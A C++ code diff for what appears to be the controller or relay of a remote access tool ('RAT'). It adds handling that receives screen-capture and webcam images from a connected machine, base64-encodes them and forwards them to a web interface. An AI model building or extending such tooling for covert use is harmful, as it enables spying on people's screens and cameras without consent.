@@ -148,15 +148,42 @@ void handleDiscovery() {
     closesocket(udpSock);
 }
 
+bool recvExact(SOCKET s, char* buf, int len) {
+    int total = 0;
+    while (total < len) {
+        int n = recv(s, buf + total, len - total, 0);
+        if (n <= 0) return false;
+        total += n;
+    }
+    return true;
+}
+
 void ratReceiverThread() {
     while (isConnectedToRat) {
         string line = receiveRatLine();
-        if (line.empty() && !isConnectedToRat) break;
-
-        // Escape JSON để tránh lỗi cú pháp khi gặp ký tự đặc biệt
-        string safeLine = escapeJsonString(line);
-        string json = "{\"type\":\"LOG\", \"data\":\"" + safeLine + "\"}";
-        sendWebFrame(json);
+        if (line.empty()) {
+            if (!isConnectedToRat) break;
+            continue;
+        }
+        if (line.rfind("SCREEN ", 0) == 0 || line.rfind("CAM ", 0) == 0) {
+            try {
+                size_t spacePos = line.find(' ');
+                int dataSize = stoi(line.substr(spacePos + 1));
+                vector<char> buffer(dataSize);
+                if (recvExact(ratSocket, buffer.data(), dataSize)) {
+                    string b64 = base64_encode((unsigned char*)buffer.data(), dataSize);
+                    string json = "{\"type\":\"LOG\", \"data\":\"" + b64 + "\"}";
+                    sendWebFrame(json);
+                }
+            } catch (...) {
+                cout << "Error parsing image data" << endl;
+            }
+        }
+        else {
+            string safeLine = escapeJsonString(line);
+            string json = "{\"type\":\"LOG\", \"data\":\"" + safeLine + "\"}";
+            sendWebFrame(json);
+        }
     }
 }
 
